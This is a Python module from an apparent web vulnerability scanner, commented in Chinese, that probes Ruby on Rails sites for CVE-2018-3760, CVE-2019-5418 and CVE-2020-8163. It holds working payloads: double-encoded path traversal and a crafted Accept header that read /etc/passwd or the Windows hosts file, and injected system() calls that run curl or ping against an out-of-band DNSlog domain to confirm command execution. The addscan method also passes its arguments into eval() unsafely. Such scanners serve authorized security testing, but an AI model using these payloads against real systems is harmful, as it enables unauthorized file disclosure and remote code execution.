#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Ruby On Rails 是著名的Ruby Web开发框架
    Ruby on Rails扫描类: 
        1. Ruby on Rails 路径遍历
            CVE-2018-3760
                Payload: https://vulhub.org/#/environments/rails/CVE-2018-3760/

        2. Ruby on Rails 路径穿越与任意文件读取
            CVE-2019-5418
                Payload: https://vulhub.org/#/environments/rails/CVE-2019-5418/

        3. Ruby on Rails 命令执行
            CVE-2020-8163
                Payload: https://github.com/h4ms1k/CVE-2020-8163/

file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from json import load
from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from lib.tool import head
from thirdparty import requests
from time import sleep
import re

class RubyOnRails():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Ruby on Rails'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2018_3760_payloads = [
            {
                'path': 'assets/file:%2f%2f/etc/passwd',
                'data': ''
            },
            {
                'path': 'assets/file:%2f%2f{}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd',
                'data': ''
            },
            {
                'path': 'assets/file:%2f%2f/C:/Windows/System32/drivers/etc/hosts',
                'data': ''
            },
            {
                'path': 'assets/file:%2f%2f{}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/C:/Windows/System32/drivers/etc/hosts',
                'data': ''
            },
            {
                'path': 'file:%2f%2f/etc/passwd',
                'data': ''
            },
            {
                'path': 'file:%2f%2f{}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd',
                'data': ''
            },
            {
                'path': 'file:%2f%2f/C:/Windows/System32/drivers/etc/hosts',
                'data': ''
            },
            {
                'path': 'file:%2f%2f{}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/C:/Windows/System32/drivers/etc/hosts',
                'data': ''
            }
        ]

        self.cve_2019_5418_payloads = [
            {
                'path': '',
                'data': '',
                'headers': head.merge(self.headers, {
                    'Accept': '../../../../../../../../etc/passwd{{'
                })
            },
            {
                'path': '',
                'data': '',
                'headers': head.merge(self.headers, {
                    'Accept': '../../../../../../../../C:/Windows/System32/drivers/etc/hosts{{'
                })
            },
            {
                'path': '',
                'data': '',
                'headers': head.merge(self.headers, {
                    'Accept': '../../../../../../../../C:\Windows\System32\drivers\etc\hosts{{'
                })
            }
        ]

        self.cve_2020_8163_payloads = [
            {
                'path': '?[system("curl DNSdomain")end%00]',
                'data': ''
            },
            {
                'path': '?[system("ping -c 4 DNSdomain")end%00]',
                'data': ''
            },
            {
                'path': '?[system("ping DNSdomain")end%00]',
                'data': ''
            }
        ]

    def cve_2018_3760_scan(self, url):
        ''' 在开发环境中使用 Sprockets 作为静态文件服务器
            Sprockets 3.7.1及更低版本存在二次解码导致的路径遍历漏洞, 攻击者可以使用%252e%252e/访问根目录并读取或执行目标服务器上的任何文件
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'File-Read'
        vul_info['vul_id'] = 'CVE-2018-3760'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in range(len(self.cve_2018_3760_payloads)):
            path = self.cve_2018_3760_payloads[payload]['path']
            target = url + path

            vul_info['path'] = path
            vul_info['target'] = target

            load_path_re = r'<h2>.* is no longer under a load path: .*/.{0,30}</h2>'

            try:
                if (payload % 2 == 0):
                    res1 = requests.get(                                                # * 获取允许的路径(路径白名单)
                        target, 
                        timeout=self.timeout, 
                        headers=self.headers,
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )
                    logger.logging(vul_info, res1.status_code, res1)                    # * LOG

                    load_path_search = re.search(load_path_re, res1.text, re.I|re.M|re.U|re.S)
                    if load_path_search:
                        path = self.cve_2018_3760_payloads[payload+1]['path']

                        load_path_s = load_path_search.group(0).lstrip('<h2>').rstrip('</h2>')
                        load_path_s = load_path_s.replace('/etc/passwd is no longer under a load path: ', '')
                        load_path_s = load_path_s.replace('C:/Windows/System32/drivers/etc/hosts is no longer under a load path: ', '')
                        load_path_list = load_path_s.split(', ')

                        for load_path in load_path_list:
                            sleep(0.5)
                            target = url + path.format(load_path)

                            res2 = requests.get(
                                target, 
                                timeout=self.timeout, 
                                headers=self.headers,
                                proxies=self.proxies, 
                                verify=False,
                                allow_redirects=False
                            )
                            logger.logging(vul_info, res2.status_code, res2)                        # * LOG

                            if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res2.text, re.I|re.M|re.S)
                                or (('Microsoft Corp' in res2.text) 
                                    and ('Microsoft TCP/IP for Windows' in res2.text))
                            ):
                                results = {
                                    'Target': target,
                                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                                    'Request': res2
                                }
                                return results
                    else:
                        continue
                else:
                    continue

            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

    def cve_2019_5418_scan(self, url):
        ''' 在控制器中通过render file形式来渲染应用之外的视图, 且会根据用户传入的Accept头来确定文件具体位置
            通过传入Accept: ../../../../../../../../etc/passwd{{头来构成构造路径穿越漏洞, 读取任意文件
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'File-Read'
        vul_info['vul_id'] = 'CVE-2019-5418'
        vul_info['vul_method'] = 'GET'

        for payload in self.cve_2019_5418_payloads:
            path = payload['path']
            headers = payload['headers']
            target = url + path

            vul_info['path'] = path
            vul_info['headers'] = headers
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )

                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
                or (('Microsoft Corp' in res.text) 
                    and ('Microsoft TCP/IP for Windows' in res.text))
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    def cve_2020_8163_scan(self, url):
        ''' 在 Rails 5.0.1 之前版本中的一个代码注入漏洞, 
            它允许攻击者控制"render"调用"locals"参数执行RCE
        '''
        sessid = '2892b92d3c3a1d8b4ab069947ddbc552'

        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2020-8163'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.cve_2020_8163_payloads:
            md = random_md5()                                       # * 随机md5值, 8位
            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

            path = payload['path'].replace('DNSdomain', dns_domain)
            target = url + path

            vul_info['path'] = path
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (md in dns.result(md, sessid)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2018_3760_scan, url=url),
            thread(target=self.cve_2019_5418_scan, url=url),
            thread(target=self.cve_2020_8163_scan, url=url)
        ]

rails = RubyOnRails()
